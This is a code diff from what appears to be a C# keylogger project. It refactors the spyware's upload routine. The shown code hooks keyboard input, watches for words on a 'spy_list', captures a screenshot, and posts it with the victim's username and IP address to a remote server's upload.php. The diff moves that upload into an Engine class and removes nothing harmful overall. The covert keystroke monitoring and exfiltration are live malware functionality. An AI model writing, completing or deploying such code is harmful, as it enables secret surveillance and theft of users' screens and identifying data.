@@ -167,29 +167,7 @@ namespace keystroke
             return Engine.takeScreenshot(screenWidth, screenHeight);
         }
 
-        private static void uploadImage(string path, string username, string ipaddr, string word)
-        {
-            try
-            {
-                WebClient client = new WebClient();
-                string myFile = path;
-                client.Credentials = CredentialCache.DefaultCredentials;
-
-                NameValueCollection parameters = new NameValueCollection();
-                parameters.Add("username", username);
-                parameters.Add("ipaddr", ipaddr);
-                parameters.Add("word", word);
-                client.QueryString = parameters;
-
-                client.UploadFile(@"http://" + SERVER_ADDRESS + "/upload.php", "POST", myFile);
-                client.Dispose();
-            }
-            catch (Exception err)
-            {
-                MessageBox.Show(err.Message);
-            }
-        }
-
+      
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
@@ -215,7 +193,7 @@ namespace keystroke
                         string path = takeScreenshot();
                         string urName = System.Environment.UserName;
                         string ipAddr = GetLocalIPAddress();
-                        uploadImage(path, urName, ipAddr, spy_list[index]);
+                        Engine.uploadImage(SERVER_ADDRESS, path, urName, ipAddr, spy_list[index]);
                     }
 
                     if( vkCode == 32 )
